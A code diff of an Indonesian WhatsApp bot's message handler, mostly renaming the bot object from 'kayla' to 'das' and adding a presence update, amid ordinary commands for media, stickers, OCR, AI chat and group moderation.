@@ -128,8 +128,12 @@ if (global.db)
     ...(global.db || {}),
   };
 
-// =_=_=_=_=_=_=_=_=_=_=_  CHAT UPDATE  _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_
-module.exports = kayla = async (kayla, m, chatUpdate, store) => {
+// =_=_=_=_=_=_=_=_=_=_=_  MODULE DAS  _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_
+module.exports = das = async (das, m, chatUpdate, store) => {
+  const unavaliable = await das.sendPresenceUpdate(
+    'unavailable',
+    m.key.remoteJid
+  );
   dbChat.push({
     id: m.key.id,
     msg: m,
@@ -189,7 +193,7 @@ module.exports = kayla = async (kayla, m, chatUpdate, store) => {
     const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
     const args = body.trim().split(/ +/).slice(1);
     const pushname = m.pushName || 'No Name';
-    const botNumber = await kayla.decodeJid(kayla.user.id);
+    const botNumber = await das.decodeJid(das.user.id);
     // console.log(botNumber);
     const isOwner = [botNumber, creator, ...owner]
       .map((v) => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
@@ -270,7 +274,7 @@ module.exports = kayla = async (kayla, m, chatUpdate, store) => {
     const sender = m.sender;
     const senderNumber = sender.split('@')[0];
     const groupMetadata = m.isGroup
-      ? await kayla.groupMetadata(m.chat).catch((e) => {})
+      ? await das.groupMetadata(m.chat).catch((e) => {})
       : '';
     const groupName = m.isGroup ? groupMetadata.subject : '';
     const participants = m.isGroup ? await groupMetadata.participants : '';
@@ -286,7 +290,7 @@ module.exports = kayla = async (kayla, m, chatUpdate, store) => {
     const isGroup = m.isGroup;
     // const isPrem = prem.includes(sender);
     const isUser = pendaftar.includes(sender);
-    const banUser = await kayla.fetchBlocklist();
+    const banUser = await das.fetchBlocklist();
     const isBanned = banUser ? banUser.includes(m.sender) : false;
     const mentionUser = [
       ...new Set([
@@ -333,7 +337,7 @@ module.exports = kayla = async (kayla, m, chatUpdate, store) => {
       console.error(err);
     }
     // =_=_=_=_=_=_=_=_=_=_=_ SELF MODE _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_
-    if (!kayla.public) {
+    if (!das.public) {
       // console.log('SELF MODE');
       if (!isOwner) return;
     }
@@ -435,7 +439,7 @@ Selama ${clockString(new Date() - user.afkTime)}
 
     // =_=_=_=_=_=_=_=_=_=_=_  PP USER  _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_
     try {
-      ppuser = await kayla.profilePictureUrl(m.sender, 'image');
+      ppuser = await das.profilePictureUrl(m.sender, 'image');
     } catch (err) {
       ppuser =
         'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60';
@@ -450,20 +454,20 @@ Selama ${clockString(new Date() - user.afkTime)}
         generate.message[type2].contextInfo = options?.contextInfo;
       if ('contextInfo' in message)
         generate.message[type2].contextInfo = message?.contextInfo;
-      return await kayla.relayMessage(chatId, generate.message, {
+      return await das.relayMessage(chatId, generate.message, {
         messageId: generate.key.id,
       });
     }
 
     const sendSticker = (pesan) => {
-      kayla.sendImageAsSticker(m.chat, pesan, m, {
+      das.sendImageAsSticker(m.chat, pesan, m, {
         packname: global.packname,
         author: global.author,
       });
     };
 
     const sendvn = (teks) => {
-      kayla.sendMessage(
+      das.sendMessage(
         from,
         { audio: teks, mimetype: 'audio/mp4', ptt: true },
         { quoted: m }
@@ -481,7 +485,7 @@ Selama ${clockString(new Date() - user.afkTime)}
     //   let teks = `╭「 *Anti ViewOnce* 」\n├ *Name* : ${pushname}\n├ *User* : @${
     //     m.sender.split('@')[0]
     //   }\n├ *Clock* : ${wib} WIB\n└ *Message* : ${m.mtype}`;
-    //   kayla.sendMessage(
+    //   das.sendMessage(
     //     ownerNumber,
     //     { text: teks, mentions: [m.sender] },
     //     { quoted: m }
@@ -549,7 +553,7 @@ Selama ${clockString(new Date() - user.afkTime)}
     };
 
     const sendMP3 = (mem, filename = 'audio') => {
-      kayla.sendMessage(
+      das.sendMessage(
         m.chat,
         {
           document: { url: mem },
@@ -563,7 +567,7 @@ Selama ${clockString(new Date() - user.afkTime)}
     };
 
     const sendOwner = (teks) => {
-      kayla.sendMessage(
+      das.sendMessage(
         ownerNumber,
         {
           text: teks,
@@ -577,10 +581,10 @@ Selama ${clockString(new Date() - user.afkTime)}
       );
     };
     const sendMenuMessage = (p) => {
-      kayla.sendMessage(from, p, { quoted: m });
+      das.sendMessage(from, p, { quoted: m });
     };
     const reply = (teks) => {
-      kayla.sendMessage(
+      das.sendMessage(
         from,
         {
           text: teks,
@@ -595,7 +599,7 @@ Selama ${clockString(new Date() - user.afkTime)}
     };
 
     const banRep = () => {
-      kayla.sendMessage(
+      das.sendMessage(
         m.chat,
         {
           text: `Maaf Anda Sudah Di Banned Silahkan Chat @${
@@ -637,11 +641,11 @@ Selama ${clockString(new Date() - user.afkTime)}
     let list = [];
     for (let i of owner) {
       list.push({
-        displayName: await kayla.getName(i + '@s.whatsapp.net'),
+        displayName: await das.getName(i + '@s.whatsapp.net'),
         vcard: `BEGIN:VCARD\n
 VERSION:3.0\n
-N:${await kayla.getName(i + '@s.whatsapp.net')}\n
-FN:${await kayla.getName(i + '@s.whatsapp.net')}\n
+N:${await das.getName(i + '@s.whatsapp.net')}\n
+FN:${await das.getName(i + '@s.whatsapp.net')}\n
 item1.TEL;waid=${i}:${i}\n
 item1.X-ABLabel:Ponsel\n
 item2.EMAIL;type=INTERNET:Faruqmaker/my.id\n
@@ -759,8 +763,8 @@ END:VCARD`,
     // =_=_=_=_=_=_=_=_=_=_=_  AUTO READ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_
     /* auto read
     if (command) {
-      kayla.sendPresenceUpdate(jd, from);
-      kayla.readMessages([m.key]);
+      das.sendPresenceUpdate(jd, from);
+      das.readMessages([m.key]);
     }
     */
 
@@ -786,7 +790,7 @@ END:VCARD`,
         let nana = ytdl(Link)
           .pipe(fs.createWriteStream(mp4File))
           .on('finish', async () => {
-            await kayla.sendMessage(
+            await das.sendMessage(
               from,
               {
                 video: fs.readFileSync(mp4File),
@@ -810,7 +814,7 @@ END:VCARD`,
         ytdl(Link, { filter: 'audioonly' })
           .pipe(fs.createWriteStream(mp3File))
           .on('finish', async () => {
-            await kayla.sendMessage(
+            await das.sendMessage(
               from,
               { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' },
               { quoted: m }
@@ -823,7 +827,7 @@ END:VCARD`,
     };
 
     async function sendPoll(jid, text, list) {
-      kayla.relayMessage(
+      das.relayMessage(
         jid,
         {
           pollCreationMessage: {
@@ -839,7 +843,7 @@ END:VCARD`,
     }
 
     async function bygbt(text) {
-      kayla.sendMessage(text, {
+      das.sendMessage(text, {
         text: '',
         templateButtons: [
           { callButton: { displayText: `P`, phoneNumber: `` } },
@@ -913,7 +917,7 @@ END:VCARD`,
       else if (mime == 'webp') type = 'sticker';
       else if (mime == 'mp4') type = 'video';
       else type = 'document';
-      return kayla.sendMessage(
+      return das.sendMessage(
         jid,
         { [type]: file.data, ...options },
         { ...options }
@@ -968,20 +972,20 @@ END:VCARD`,
       return build_server + data.image;
     }
 
-    async function genProfile(kayla, m) {
+    async function genProfile(das, m) {
       let font = await Jimp.loadFont('./name.fnt'),
         mask = await Jimp.read('https://i.imgur.com/552kzaW.png'),
         welcome = await Jimp.read(
           'https://telegra.ph/file/81260a8b9e8cff26d2b48.jpg'
         ),
         avatar = await Jimp.read(
-          await kayla
+          await das
             .profilePictureUrl(m.sender, 'image')
             .catch(() => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
         ),
         status =
           (
-            (await kayla.fetchStatus(m.sender).catch(console.log)) || {}
+            (await das.fetchStatus(m.sender).catch(console.log)) || {}
           ).status?.slice(0, 30) || 'Not Detected';
       await avatar.resize(460, 460);
       await mask.resize(460, 460);
@@ -1143,7 +1147,7 @@ END:VCARD`,
       let progene = await generateWAMessageFromContent(jid, prod, {
         quoted: troli,
       });
-      return kayla.relayMessage(progene.key.remoteJid, progene.message, {
+      return das.relayMessage(progene.key.remoteJid, progene.message, {
         messageId: '',
       });
     }
@@ -1156,7 +1160,7 @@ END:VCARD`,
           type: 1,
         },
       ];
-      return kayla.sendButtonText(
+      return das.sendButtonText(
         m.chat,
         buttons,
         teks,
@@ -1169,7 +1173,7 @@ END:VCARD`,
     if (autosticker) {
       if (/image/.test(mime) && !/webp/.test(mime)) {
         let media = await quoted.download();
-        let encmedia = await kayla.sendImageAsSticker(m.chat, media, m, {
+        let encmedia = await das.sendImageAsSticker(m.chat, media, m, {
           packname: global.packname,
           author: global.author,
         });
@@ -1178,7 +1182,7 @@ END:VCARD`,
         if ((quoted.msg || quoted).seconds > 11)
           return reply('Maksimal 10 detik!');
         let media = await quoted.download();
-        let encmedia = await kayla.sendVideoAsSticker(m.chat, media, m, {
+        let encmedia = await das.sendVideoAsSticker(m.chat, media, m, {
           packname: global.packname,
           author: global.author,
         });
@@ -1190,28 +1194,28 @@ END:VCARD`,
     if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
       if (!isBotAdmins) return;
       if (budy.match(`chat.whatsapp.com`)) {
-        kayla.sendMessage(
+        das.sendMessage(
           m.chat,
           {
             text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`,
           },
           { quoted: m }
         );
-        kayla.groupParticipantsUpdate(m.chat, [sender], 'remove');
+        das.groupParticipantsUpdate(m.chat, [sender], 'remove');
       }
     }
     // =_=_=_=_=_=_=_=_=_=_=_  ANTI WA ME_=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_
     if (m.isGroup && !m.key.fromMe && !isOwner && antiwame) {
       if (!isBotAdmins) return;
       if (budy.match(`wa.me`)) {
-        kayla.sendMessage(
+        das.sendMessage(
           m.chat,
           {
             text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`,
           },
           { quoted: m }
         );
-        kayla.groupParticipantsUpdate(m.chat, [sender], 'remove');
+        das.groupParticipantsUpdate(m.chat, [sender], 'remove');
       }
     }
 
@@ -1222,14 +1226,14 @@ END:VCARD`,
     ) {
       var get_data_respon = getDataResponList(m.chat, chath, db_respon_list);
       if (get_data_respon.isImage === false) {
-        kayla.sendMessage(
+        das.sendMessage(
           m.chat,
           { text: sendResponList(m.chat, chath, db_respon_list) },
           { quoted: m }
         );
       } else {
         buff = await getBuffer(get_data_respon.image_url);
-        kayla.sendImage(m.chat, buff, `${get_data_respon.response}`, m);
+        das.sendImage(m.chat, buff, `${get_data_respon.response}`, m);
       }
     }
 
@@ -1240,14 +1244,14 @@ END:VCARD`,
     if (!isCmd && isAlreadykaylaList(chath, dblist)) {
       var getkaydata = getDatakaylaList(chath, dblist);
       if (getkaydata.isImage === false) {
-        kayla.sendMessage(
+        das.sendMessage(
           m.chat,
           { text: sendkaylaList(chath, dblist) },
           { quoted: m }
         );
       } else {
         buff = await getBuffer(getkaydata.image_url);
-        kayla.sendImage(m.chat, buff, `${getkaydata.response}`, m);
+        das.sendImage(m.chat, buff, `${getkaydata.response}`, m);
       }
     }
 
@@ -1292,7 +1296,7 @@ END:VCARD`,
             `Kirim/Reply gambar dengan Caption ${prefix + command}\n`
           );
         if (/image/.test(mime)) {
-          let media = await kayla.downloadAndSaveMediaMessage(quoted, 'ocr');
+          let media = await das.downloadAndSaveMediaMessage(quoted, 'ocr');
 
           exec(`tesseract ${media} temporary/ocr`, async (err, stdout) => {
             if (err) return reply(`${err}`);
@@ -1354,8 +1358,8 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
   `;
 
         let ment = isGroup ? participants.map((a) => a.id) : [];
-        kayla.sendMessage(m.chat, { text: txt, mentions: ment }, { quoted: m });
-        kayla.sendMessage(sender, { text: txt }, { quoted: m });
+        das.sendMessage(m.chat, { text: txt, mentions: ment }, { quoted: m });
+        das.sendMessage(sender, { text: txt }, { quoted: m });
         break;
       case 'button':
         const templateButtons = [
@@ -1416,7 +1420,7 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
           templateButtons: templateButtons,
         };
 
-        kayla.sendMessage(from, templateMessage);
+        das.sendMessage(from, templateMessage);
         break;
 
       case 'khs':
@@ -1468,7 +1472,7 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
         console.log(res.data);
         if (!res.data.status) return reply(res.data.message);
         reply('Sedang Mengirim...');
-        kayla.sendMessage(
+        das.sendMessage(
           m.chat,
           {
             video: { url: res.data.data.result.watermark },
@@ -1476,7 +1480,7 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
           },
           { quoted: m }
         );
-        kayla.sendMessage(
+        das.sendMessage(
           m.chat,
           {
             video: { url: res.data.data.result.nowatermark },
@@ -1495,7 +1499,7 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
         );
         if (!res.data.status) return reply(res.data.message);
         reply(JSON.stringify(res.data.data));
-        kayla.sendMessage(
+        das.sendMessage(
           m.chat,
           {
             document: { url: res.data.data.link },
@@ -1543,7 +1547,7 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
           sections: choiceMessage,
           listType: 1,
         };
-        kayla.sendMessage(from, listMessage, { quoted: m });
+        das.sendMessage(from, listMessage, { quoted: m });
         // sendMenuMessage(listMessage);
         break;
 
@@ -1597,7 +1601,7 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
             return reply(
               `Chat dengan AI.\n\nContoh:\n${prefix}${command} Apa itu resesi`
             );
-          kayla.sendPresenceUpdate('composing', from);
+          das.sendPresenceUpdate('composing', from);
           const configuration = new Configuration({
             apiKey: fs.readFileSync('openai.txt', 'utf-8').trim(),
           });
@@ -1671,7 +1675,7 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
             });
 
           await sleep(s);
-          kayla.sendMessage(
+          das.sendMessage(
             m.chat,
             {
               document: {
@@ -1698,7 +1702,7 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
             m.message.extendedTextMessage.contextInfo.quotedMessage
               .documentMessage.fileName;
 
-          media = await kayla.downloadAndSaveMediaMessage(
+          media = await das.downloadAndSaveMediaMessage(
             quoted,
             (filename = fileName),
             false
@@ -1711,12 +1715,12 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
 
         break;
       case 'self':
-        kayla.public = false;
+        das.public = false;
         m.reply('Succes');
         break;
       case 'public':
-        if (kayla.public) return reply('Sudah public');
-        kayla.public = true;
+        if (das.public) return reply('Sudah public');
+        das.public = true;
         m.reply('Succes');
         break;
 
@@ -1755,7 +1759,7 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
           await rimraf(dir, async (err) => {
             if (err) return reply('Nomor ini tidak terdaftar sebagai bot!! 1');
 
-            await kayla.sendMessage(from, buttonMessage, { quoted: m });
+            await das.sendMessage(from, buttonMessage, { quoted: m });
           });
         } else {
           return reply('Nomor ini tidak terdaftar sebagai bot!! 2');
@@ -1792,28 +1796,26 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
             buttons: buttons,
             headerType: 1,
           };
-          await kayla.sendMessage(from, buttonMessage, { quoted: m });
+          await das.sendMessage(from, buttonMessage, { quoted: m });
           //BUTTON MESSAGE
           console.log('START RUN JADIBOT');
-          const runJadibot = await jadibot(kayla, m, from, botNumber);
+          const runJadibot = await jadibot(das, m, from, botNumber);
         }
         break;
       case 'listjadibot':
         try {
           let user = [
             ...new Set([
-              ...global.conns
-                .filter((kayla) => kayla.user)
-                .map((kayla) => kayla.user),
+              ...global.conns.filter((das) => das.user).map((das) => das.user),
             ]),
           ];
           te = '*List Jadibot*\n\n';
           for (let i of user) {
-            y = await kayla.decodeJid(i.id);
+            y = await das.decodeJid(i.id);
             te += ' × User : @' + y.split('@')[0] + '\n';
             te += ' × Name : ' + i.name + '\n\n';
           }
-          kayla.sendMessage(from, { text: te, mentions: [y] }, { quoted: m });
+          das.sendMessage(from, { text: te, mentions: [y] }, { quoted: m });
         } catch (err) {
           reply(`Belum Ada User Yang Jadibot`);
         }
@@ -1826,7 +1828,7 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
         break;
       case 'owner':
         {
-          const repf = await kayla.sendMessage(
+          const repf = await das.sendMessage(
             from,
             {
               contacts: {
@@ -1837,7 +1839,7 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
             },
             { quoted: m }
           );
-          kayla.sendMessage(
+          das.sendMessage(
             from,
             {
               text: `Hai Kak @${
@@ -1880,7 +1882,7 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
           }\nRuntime Bot : ${runtime(
             process.uptime()
           )}\nSpeed Bot : ${latensi.toFixed(4)} 𝘋𝘦𝘵𝘪𝘬\nMode : ${
-            kayla.public ? 'Public' : 'Self'
+            das.public ? 'Public' : 'Self'
           }\n`,
           mentions: [sender, botzkayla, mark],
           footer: `Created By @${
@@ -1889,10 +1891,10 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
           buttons: butlocNye,
           headerType: 'LOCATION',
         };
-        const tyds = await kayla.sendMessage(from, buttonLocnya, {
+        const tyds = await das.sendMessage(from, buttonLocnya, {
           quoted: m,
         });
-        kayla.sendMessage(from, listMenuMessage, { quoted: tyds });
+        das.sendMessage(from, listMenuMessage, { quoted: tyds });
 
         break;
       case 'allmenu':
@@ -2175,7 +2177,7 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
           reply('Berhasil Mendapatkan Satu Orang');
         }, 3000);
         setTimeout(() => {
-          kayla.sendMessage(
+          das.sendMessage(
             from,
             {
               text: `Nih Kak @${teman.no.split('@')[0]}`,
@@ -2189,7 +2191,7 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
       case 'scriptbot':
       case 'scbot':
         {
-          kayla.sendMessage(
+          das.sendMessage(
             m.sender,
             {
               text: `Hai kak, SC ini free ya!!\n\nTapi syaratnya sebelum pake SC ini, jangan lupa kasih *STAR* ⭐ dan klik *FORK* ya 🇲🇨\n\nSC : https://github.com/dasx000/MD-BOTDAS\n\n`,
@@ -2197,7 +2199,7 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
             },
             { quoted: m }
           );
-          kayla.sendMessage(
+          das.sendMessage(
             m.chat,
             {
               text: `\nHai kak, SC sudah saya kirim dichat pribadi!! jangan lupa baca petunjuknya ya 🫡\n`,
@@ -2209,7 +2211,7 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
         break;
       case 'screstapi':
         {
-          kayla.sendMessage(
+          das.sendMessage(
             m.sender,
             {
               text: `Hai kak, SC ini free ya!!\n\nTapi syaratnya sebelum pake SC ini, jangan lupa kasih *STAR* ⭐ dan klik *FORK* ya 🇲🇨\n\nSC : https://github.com/dasx000/das-rest-api\n\n*FITUR*\n⭐ 3 ROLE (admin, premium, member)\n⭐ Fitur login\n⭐ Google Recaptcha\n⭐ dll.....\n\n`,
@@ -2217,7 +2219,7 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
             },
             { quoted: m }
           );
-          kayla.sendMessage(
+          das.sendMessage(
             m.chat,
             {
               text: `\nHai kak, SC sudah saya kirim dichat pribadi!! jangan lupa baca petunjuknya ya 🫡\n`,
@@ -2231,7 +2233,7 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
       // case 'quoted':
       //   {
       //     if (!m.quoted) return reply('Reply Pesannya!!');
-      //     let wokwol = await kayla.serializeM(await m.getQuotedObj());
+      //     let wokwol = await das.serializeM(await m.getQuotedObj());
       //     if (!wokwol.quoted)
       //       return reply('Pesan Yang anda reply tidak mengandung reply');
       //     await wokwol.quoted.copyNForward(m.chat, true);
@@ -2252,7 +2254,7 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
                   fs.unlinkSync(ranm);
                   buff = fs.readFileSync(rano);
                   if (err) return reply(mess.error);
-                  kayla.sendMessage(
+                  das.sendMessage(
                     m.chat,
                     { audio: buff, mimetype: 'audio/mp4', ptt: false },
                     { quoted: m }
@@ -2267,7 +2269,7 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
           if (!isPrem) return replyprem(mess.premium);
           if (!q) return reply(`Contoh ${prefix + command} kirbotzx`);
           aj = await igstalk(`${q}`);
-          kayla.sendMessage(
+          das.sendMessage(
             m.chat,
             {
               image: { url: aj.profile },
@@ -2327,7 +2329,7 @@ Latest Publish Time : ${eha.latestPublishTime}`);
         {
           if (!q) return reply(`Contoh ${prefix + command} KirBotz`);
           aj = await githubstalk.githubstalk(`${q}`);
-          kayla.sendMessage(
+          das.sendMessage(
             m.chat,
             {
               image: { url: aj.profile_pic },
@@ -2364,7 +2366,7 @@ Updated At : ${aj.updated_at}`,
           await scp1
             .ssweb(q)
             .then((krt) => {
-              kayla.sendMessage(
+              das.sendMessage(
                 m.chat,
                 { image: krt.result, caption: mess.succes },
                 { quoted: m }
@@ -2382,7 +2384,7 @@ Updated At : ${aj.updated_at}`,
           if (!isUrl(args[0]) && !args[0].includes('whatsapp.com'))
             return reply('Link Invalid!');
           let result = args[0].split('https://chat.whatsapp.com/')[1];
-          await kayla
+          await das
             .groupAcceptInvite(result)
             .then((res) => reply(jsonformat(res)))
             .catch((err) => reply(jsonformat(err)));
@@ -2392,8 +2394,8 @@ Updated At : ${aj.updated_at}`,
         {
           if (!quoted) return reply(`Reply Image/Video`);
           if (/image/.test(mime)) {
-            anuan = await kayla.downloadAndSaveMediaMessage(quoted);
-            kayla.sendMessage(
+            anuan = await das.downloadAndSaveMediaMessage(quoted);
+            das.sendMessage(
               m.chat,
               {
                 image: { url: anuan },
@@ -2404,8 +2406,8 @@ Updated At : ${aj.updated_at}`,
               { quoted: m }
             );
           } else if (/video/.test(mime)) {
-            anuanuan = await kayla.downloadAndSaveMediaMessage(quoted);
-            kayla.sendMessage(
+            anuanuan = await das.downloadAndSaveMediaMessage(quoted);
+            das.sendMessage(
               m.chat,
               {
                 video: { url: anuanuan },
@@ -2441,7 +2443,7 @@ Updated At : ${aj.updated_at}`,
               type: 1,
             },
           ];
-          await kayla.sendButtonText(
+          await das.sendButtonText(
             m.chat,
             buttons,
             `Mode Autosticker`,
@@ -2456,7 +2458,7 @@ Updated At : ${aj.updated_at}`,
         anu = await store.chats.all().map((v) => v.id);
         for (let yoi of anu) {
           if (!yoi.includes('@g.us')) {
-            kayla.sendMessage(yoi, {
+            das.sendMessage(yoi, {
               text: `\n\n${q}`,
             });
           }
@@ -2469,7 +2471,7 @@ Updated At : ${aj.updated_at}`,
         anu = await store.chats.all().map((v) => v.id);
         for (let yoi of anu) {
           if (yoi.includes('@g.us')) {
-            kayla.sendMessage(yoi, {
+            das.sendMessage(yoi, {
               text: `\n\n${q}`,
             });
           }
@@ -2481,7 +2483,7 @@ Updated At : ${aj.updated_at}`,
         if (!q) return reply(`Teks Nya Bang?`);
         anu = await store.chats.all().map((v) => v.id);
         for (let yoi of anu) {
-          kayla.sendMessage(yoi, {
+          das.sendMessage(yoi, {
             text: `\n\n${q}`,
           });
         }
@@ -2512,7 +2514,7 @@ Updated At : ${aj.updated_at}`,
               } add/del 6285768966412`
             );
           orgnye = q.split('|')[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`;
-          let ceknye = await kayla.onWhatsApp(orgnye);
+          let ceknye = await das.onWhatsApp(orgnye);
           if (ceknye.length == 0)
             return reply(
               `Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`
@@ -2520,11 +2522,11 @@ Updated At : ${aj.updated_at}`,
           const isBane = banUser ? banUser.includes(orgnye) : false;
           if (args[0] === 'add') {
             if (isBane) return reply('User Sudah Dibanned');
-            kayla.updateBlockStatus(orgnye, 'block');
+            das.updateBlockStatus(orgnye, 'block');
             reply(`Succes Ban`);
           } else if (args[0] === 'del') {
             if (!isBane) return reply('User Tidak Dibanned');
-            kayla.updateBlockStatus(orgnye, 'unblock');
+            das.updateBlockStatus(orgnye, 'unblock');
             reply(`Succes Unban`);
           } else {
             reply('Error');
@@ -2561,10 +2563,10 @@ Updated At : ${aj.updated_at}`,
               footer: fake,
               title: '     「 List Participants Blockir 」',
               buttonText: 'List Blockir',
-              mentions: await kayla.parseMention(teskd),
+              mentions: await das.parseMention(teskd),
               sections,
             };
-            kayla.sendMessage(from, listMessage, { quoted: m });
+            das.sendMessage(from, listMessage, { quoted: m });
           } catch {
             reply('Tidak ada user yang diblockir');
           }
@@ -2586,7 +2588,7 @@ Updated At : ${aj.updated_at}`,
         if (text > 700) return reply(`Teks Kepanjangan`);
         num = q.split('|')[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
         pesan = q.split('|')[1];
-        let cekno = await kayla.onWhatsApp(num);
+        let cekno = await das.onWhatsApp(num);
         if (cekno.length == 0)
           return reply(
             `Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`
@@ -2603,7 +2605,7 @@ Updated At : ${aj.updated_at}`,
             type: 1,
           },
         ];
-        await kayla.sendButtonText(
+        await das.sendButtonText(
           num,
           buttons,
           `Hi Saya Bot Ada Yang Kirim Pesan Ke Kamu
@@ -2624,7 +2626,7 @@ Contoh Penggunaan: ${prefix + command} nomor|pesan untuknya
 Contoh: ${prefix + command} 628xxxxxxxx|hai owner`,
           m
         );
-        await kayla.sendMessage(
+        await das.sendMessage(
           num,
           {
             text: `𝘈𝘯𝘥𝘢 𝘑𝘶𝘨𝘢 𝘉𝘪𝘴𝘢 𝘔𝘦𝘮𝘣𝘢𝘭𝘢𝘴 𝘗𝘦𝘴𝘢𝘯 𝘕𝘺𝘢 𝘋𝘦𝘯𝘨𝘢𝘯 𝘊𝘢𝘳𝘢 𝘔𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘗𝘦𝘴𝘢𝘯, 𝘑𝘪𝘬𝘢 𝘈𝘯𝘥𝘢 𝘛𝘪𝘥𝘢𝘬 𝘔𝘢𝘶 𝘔𝘦𝘮𝘣𝘢𝘭𝘢𝘴 𝘕𝘺𝘢 𝘗𝘦𝘯𝘤𝘦𝘵 𝘉𝘶𝘵𝘵𝘰𝘯 𝘽𝙞𝙖𝙧𝙞𝙣 𝘋𝘪 𝘈𝘵𝘢𝘴 𝘠𝘢𝘩 𝘔𝘢𝘬𝘢𝘴𝘪𝘩`,
@@ -2651,7 +2653,7 @@ Isi Pesan : ${pesan}
         break;
       case 'leave': {
         if (m.isGroup && isOwner && command == 'leave')
-          return kayla.groupLeave(from);
+          return das.groupLeave(from);
         if (m.isGroup) return reply('Only private chat');
         var room = Object.values(anon.anonymous).find((p) => p.check(sender));
         if (!room) return reply('Anda tidak berada didalam room');
@@ -2659,7 +2661,7 @@ Isi Pesan : ${pesan}
         var other = room.other(sender);
         delete anon.anonymous[room.id];
         if (other != '')
-          kayla.sendMessage(other, {
+          das.sendMessage(other, {
             text: 'Bye...',
           });
         if (command == 'leave') break;
@@ -2707,7 +2709,7 @@ Isi Pesan : ${pesan}
               type: 1,
             },
           ];
-          await kayla.sendButtonText(
+          await das.sendButtonText(
             m.chat,
             buttons,
             `Mode Antilink`,
@@ -2741,7 +2743,7 @@ Isi Pesan : ${pesan}
               type: 1,
             },
           ];
-          await kayla.sendButtonText(
+          await das.sendButtonText(
             m.chat,
             buttons,
             `Mode Antiwame`,
@@ -2758,7 +2760,7 @@ Isi Pesan : ${pesan}
           let users = m.quoted
             ? m.quoted.sender
             : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-          await kayla
+          await das
             .groupParticipantsUpdate(m.chat, [users], 'add')
             .then((res) => reply(jsonformat(res)))
             .catch((err) => reply(jsonformat(err)));
@@ -2783,7 +2785,7 @@ Isi Pesan : ${pesan}
         setTimeout(() => {
           var nomor = m.participant;
           const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`;
-          kayla.groupSettingUpdate(from, 'announcement');
+          das.groupSettingUpdate(from, 'announcement');
           reply(close);
         }, timer);
         break;
@@ -2806,7 +2808,7 @@ Isi Pesan : ${pesan}
         setTimeout(() => {
           var nomor = m.participant;
           const open = `*Tepat waktu* grup dibuka oleh admin\n sekarang member dapat mengirim pesan`;
-          kayla.groupSettingUpdate(from, 'not_announcement');
+          das.groupSettingUpdate(from, 'not_announcement');
           reply(open);
         }, timer);
         break;
@@ -2819,7 +2821,7 @@ Isi Pesan : ${pesan}
           : m.quoted
           ? m.quoted.sender
           : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-        await kayla
+        await das
           .groupParticipantsUpdate(m.chat, [users], 'remove')
           .then((res) => reply(jsonformat(res)))
           .catch((err) => reply(jsonformat(err)));
@@ -2835,7 +2837,7 @@ Isi Pesan : ${pesan}
             : m.quoted
             ? m.quoted.sender
             : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-          await kayla
+          await das
             .groupParticipantsUpdate(m.chat, [users], 'promote')
             .then((res) => reply(jsonformat(res)))
             .catch((err) => reply(jsonformat(err)));
@@ -2851,7 +2853,7 @@ Isi Pesan : ${pesan}
             : m.quoted
             ? m.quoted.sender
             : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-          await kayla
+          await das
             .groupParticipantsUpdate(m.chat, [users], 'demote')
             .then((res) => reply(jsonformat(res)))
